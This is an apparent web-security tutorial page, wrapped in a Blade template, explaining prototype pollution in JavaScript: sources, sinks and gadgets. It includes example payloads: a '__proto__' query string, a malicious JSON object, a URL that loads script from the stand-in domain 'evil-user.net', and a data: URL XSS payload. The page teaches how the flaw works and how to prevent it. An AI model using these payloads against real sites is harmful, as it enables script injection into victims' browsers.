@extends('layouts.academy')

@section('title', 'What is prototype pollution? | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="32">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>Prototype pollution</h3>
        <ul>
            <li><a href="/web-security/prototype-pollution">What is prototype pollution?</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-1">
                <label for="sub-nav-id-1">
                    <a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance">JavaScript prototypes and inheritance</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-an-object-in-javascript">What is an object in JavaScript?</a></li>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript">What is a prototype in JavaScript?</a></li>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#how-does-object-inheritance-work-in-javascript">Object inheritance</a></li>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain">Prototype chain</a></li>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto">Accessing an object's prototype</a></li>
                    <li><a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#modifying-prototypes">Modifying prototypes</a></li>
                </ul>
            </li>
            <li><a href="/web-security/prototype-pollution#how-do-prototype-pollution-vulnerabilities-arise">How vulnerabilities arise</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/prototype-pollution#prototype-pollution-sources">Sources</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/prototype-pollution#prototype-pollution-via-the-url">URL</a></li>
                    <li><a href="/web-security/prototype-pollution#prototype-pollution-via-json-input">JSON input</a></li>
                </ul>
            </li>
            <li><a href="/web-security/prototype-pollution#prototype-pollution-sinks">Sinks</a></li>
            <li><a href="/web-security/prototype-pollution#prototype-pollution-gadgets">Gadgets</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/prototype-pollution/client-side">Client-side prototype pollution</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-manually">Finding sources manually</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-sources-using-dom-invader">Finding sources using DOM Invader</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-manually">Finding gadgets manually</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#finding-client-side-prototype-pollution-gadgets-using-dom-invader">Finding gadgets using DOM Invader</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#prototype-pollution-via-the-constructor">Prototype pollution via the constructor</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization">Bypassing flawed key sanitization</a></li>
                    <li><a href="/web-security/prototype-pollution/client-side#prototype-pollution-in-external-libraries">Prototype pollution in external libraries</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-4">
                        <label for="sub-nav-id-4">
                            <a href="/web-security/prototype-pollution/client-side/browser-apis">Prototype pollution via browser APIs</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-fetch">fetch() method</a></li>
                            <li><a href="/web-security/prototype-pollution/client-side/browser-apis#prototype-pollution-via-object-defineproperty">Object.defineProperty() method</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-5">
                <label for="sub-nav-id-5">
                    <a href="/web-security/prototype-pollution/server-side">Server-side prototype pollution</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/prototype-pollution/server-side#why-is-server-side-prototype-pollution-more-difficult-to-detect">Why is server-side prototype pollution more difficult to detect?</a></li>
                    <li><a href="/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-via-polluted-property-reflection">Detecting via polluted property reflection</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-6">
                        <label for="sub-nav-id-6">
                            <a href="/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection">Detecting without polluted property reflection</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/prototype-pollution/server-side#status-code-override">Status code override</a></li>
                            <li><a href="/web-security/prototype-pollution/server-side#json-spaces-override">JSON spaces override</a></li>
                            <li><a href="/web-security/prototype-pollution/server-side#charset-override">Charset override</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/prototype-pollution/server-side#scanning-for-server-side-prototype-pollution-sources">Scanning for sources</a></li>
                    <li><a href="/web-security/prototype-pollution/server-side#bypassing-input-filters-for-server-side-prototype-pollution">Bypassing input filters</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-7">
                        <label for="sub-nav-id-7">
                            <a href="/web-security/prototype-pollution/server-side#remote-code-execution-via-server-side-prototype-pollution">Remote code execution</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/prototype-pollution/server-side#identifying-a-vulnerable-request">Identifying a vulnerable request</a></li>
                            <li><a href="/web-security/prototype-pollution/server-side#remote-code-execution-via-child-process-fork">child_process.fork() method</a></li>
                            <li><a href="/web-security/prototype-pollution/server-side#remote-code-execution-via-child-process-execsync">child_process.execSync() method</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-8">
                <label for="sub-nav-id-8">
                    <a href="/web-security/prototype-pollution/preventing">Preventing vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/prototype-pollution/preventing#sanitizing-property-keys">Sanitizing property keys</a></li>
                    <li><a href="/web-security/prototype-pollution/preventing#preventing-changes-to-prototype-objects">Preventing changes to prototype objects</a></li>
                    <li><a href="/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties">Preventing an object from inheriting properties</a></li>
                    <li><a href="/web-security/prototype-pollution/preventing#using-safer-alternatives-where-possible">Using safer alternatives where possible</a></li>
                </ul>
            </li>
            <li><a href="/web-security/all-labs#prototype-pollution">View all prototype pollution labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/prototype-pollution"><span itemprop="name">Prototype pollution</span></a><meta itemprop="position" content="2" /></li></ul>    <div class="section theme-white">

        <h1 cms-ignore-validation="DUPLICATE_HEADINGS" class="heading-2" id="what-is-prototype-pollution" chunk-id="2B5DA48F38C4522FCDB23BCB248487CE">What is prototype pollution?</h1><p>
    Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.
</p><img alt="Polluting a config object via prototype pollution" src="/web-security/prototype-pollution/images/prototype-pollution-infographic.svg"><p>
    Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to <a href="/web-security/cross-site-scripting/dom-based">DOM XSS</a>, while server-side prototype pollution can even result in remote code execution.
</p><p id="what-is-prototype-pollution-D4R0">
    If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing.
</p><p>
    <a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance">JavaScript prototypes and inheritance</a>
</p><div class="highlightedarea">
    <h4>Labs</h4>
    <p>
        If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.
    </p>

    <ul><li><a href="/web-security/all-labs#prototype-pollution"><span class="label-light-green-small">LABS</span> View all prototype pollution labs</a></li></ul></div><h2 id="how-do-prototype-pollution-vulnerabilities-arise" chunk-id="4610C7A249DBAF927D8FB2C2F714B3C1">How do prototype pollution vulnerabilities arise?</h2><p>
    Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like <code>__proto__</code>, along with arbitrary nested properties.
</p><p>
    Due to the <a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#accessing-an-object-s-prototype-using-proto">special meaning of <code>__proto__</code></a> in a JavaScript context, the merge operation may assign the nested properties to the object's <a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#what-is-a-prototype-in-javascript">prototype</a> instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
</p><p>
    It's possible to pollute any prototype object, but this most commonly occurs with the <a href="/web-security/prototype-pollution/javascript-prototypes-and-inheritance#the-prototype-chain">built-in global <code>Object.prototype</code></a>.
</p><p id="how-do-prototype-pollution-vulnerabilities-arise-A9A4" chunk-id="8FAE00E84D351673027266B76FE5543B">
    Successful exploitation of prototype pollution requires the following key components:
</p><ul>
    <li>
        <p>
            <a href="/web-security/prototype-pollution#prototype-pollution-sources">A prototype pollution source</a> - This is any input that enables you to poison prototype objects with arbitrary properties.
        </p>
    </li>
    <li>
        <p>
            <a href="/web-security/prototype-pollution#prototype-pollution-sinks">A sink</a> - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
        </p>
    </li>
    <li>
        <p>
            <a href="/web-security/prototype-pollution#prototype-pollution-gadgets">An exploitable gadget</a> - This is any property that is passed into a sink without proper filtering or sanitization.
        </p>
    </li>
</ul><h2 id="prototype-pollution-sources" chunk-id="A7B427ED14AA031ECEBB90E0CB075E2F">Prototype pollution sources</h2><p>
    A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:
</p><ul>
    <li>
        <p>
            The <a href="/web-security/prototype-pollution#prototype-pollution-via-the-url">URL</a> via either the query or fragment string (hash)
        </p>
    </li>
    <li>
        <p>
            <a href="/web-security/prototype-pollution#prototype-pollution-via-json-input">JSON-based input</a>
        </p>
    </li>
    <li>
        <p>
            Web messages
        </p>
    </li>
</ul><h3 id="prototype-pollution-via-the-url" chunk-id="2AA6D4323F49F760330910DBE128A28A">Prototype pollution via the URL</h3><p>
    Consider the following URL, which contains an attacker-constructed query string:
</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[evilProperty]=payload</code><p>
    When breaking the query string down into <code>key:value</code> pairs, a URL parser may interpret <code>__proto__</code> as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.
</p><p>
    You might think that the <code>__proto__</code> property, along with its nested <code>evilProperty</code>, will just be added to the target object as follows:
</p><code class="code-scrollable">{
    existingProperty1: 'foo',
    existingProperty2: 'bar',
    __proto__: {
        evilProperty: 'payload'
    }
}</code><p>
    However, this isn't the case. At some point, the recursive merge operation may assign the value of <code>evilProperty</code> using a statement equivalent to the following:
</p><code class="code-scrollable">targetObject.__proto__.evilProperty = 'payload';</code><p>
    During this assignment, the JavaScript engine treats <code>__proto__</code> as a getter for the prototype. As a result, <code>evilProperty</code> is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default <code>Object.prototype</code>, all objects in the JavaScript runtime will now inherit <code>evilProperty</code>, unless they already have a property of their own with a matching key.
</p><p>
    In practice, injecting a property called <code>evilProperty</code> is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.
</p><h3 id="prototype-pollution-via-json-input" chunk-id="D8F59D8A14D16BA22E4BB75FB5FF418B">Prototype pollution via JSON input</h3><p>
    User-controllable objects are often derived from a JSON string using the <code>JSON.parse()</code> method. Interestingly, <code>JSON.parse()</code> also treats any key in the JSON object as an arbitrary string, including things like <code>__proto__</code>. This provides another potential vector for prototype pollution.
</p><p>
    Let's say an attacker injects the following malicious JSON, for example, via a web message:
</p><code class="code-scrollable">{
    "__proto__": {
        "evilProperty": "payload"
    }
}</code><p>
    If this is converted into a JavaScript object via the <code>JSON.parse()</code> method, the resulting object will in fact have a property with the key <code>__proto__</code>:
</p><code class="code-scrollable">const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     <span class="grey">// false</span>
objectFromJson.hasOwnProperty('__proto__');    <span class="grey">// true</span></code><p>
    If the object created via <code>JSON.parse()</code> is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous <a href="/web-security/prototype-pollution#prototype-pollution-via-the-url">URL-based example</a>.
</p><h2 id="prototype-pollution-sinks" chunk-id="36F06834EB4E53A18684A3BBCED15679">Prototype pollution sinks</h2><p>
    A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on <a href="/web-security/cross-site-scripting/dom-based">DOM XSS</a>.
</p><p>
    As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
</p><h2 id="prototype-pollution-gadgets" chunk-id="FCD70134FB58E4A420F8A5EEB587965E">Prototype pollution gadgets</h2><p>
    A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
</p><ul>
    <li>
        <p>
            Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
        </p>
    </li>
    <li>
        <p>
            Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
        </p>
    </li>
</ul><p>
    A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. <a href="/web-security/prototype-pollution/preventing#preventing-an-object-from-inheriting-properties">Robust websites</a> may also explicitly set the prototype of the object to <code>null</code>, which ensures that it doesn't inherit any properties at all.
</p><h3 id="example-of-a-prototype-pollution-gadget" chunk-id="CE2E1348977C5BDF1900384829B6F007">Example of a prototype pollution gadget</h3><p>
    Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:
</p><code class="code-scrollable">let transport_url = config.transport_url || defaults.transport_url;</code><p>
    Now imagine the library code uses this <code>transport_url</code> to add a script reference to the page:
</p><code class="code-scrollable">let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);</code><p>
    If the website's developers haven't set a <code>transport_url</code> property on their <code>config</code> object, this is a potential gadget. In cases where an attacker is able to pollute the global <code>Object.prototype</code> with their own <code>transport_url</code> property, this will be inherited by the <code>config</code> object and, therefore, set as the <code>src</code> for this script to a domain of the attacker's choosing.
</p><p>
    If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net</code><p>
    By providing a <code>data:</code> URL, an attacker could also directly embed an XSS payload within the query string as follows:
</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//</code><p>
    Note that the trailing <code>//</code> in this example is simply to comment out the hardcoded <code>/example.js</code> suffix.
</p><h3 id="what-next" cms-ignore-validation="DUPLICATE_HEADINGS">What next?</h3><p>
    Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:
</p><ul>
    <li>
        <a href="/web-security/prototype-pollution/client-side"><span class="label-light-green-small">LABS</span> Client-side prototype pollution vulnerabilities</a></li><li><a href="/web-security/prototype-pollution/server-side"><span class="label-light-green-small">LABS</span> Server-side prototype pollution vulnerabilities</a></li><li><a href="/web-security/prototype-pollution/preventing">Preventing prototype pollution vulnerabilities</a>
    </li>
</ul>
        
        @endverbatim@include('partials.widget', ['id' => 'academy-registration-footer'])@verbatim
    
    </div>


    
    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
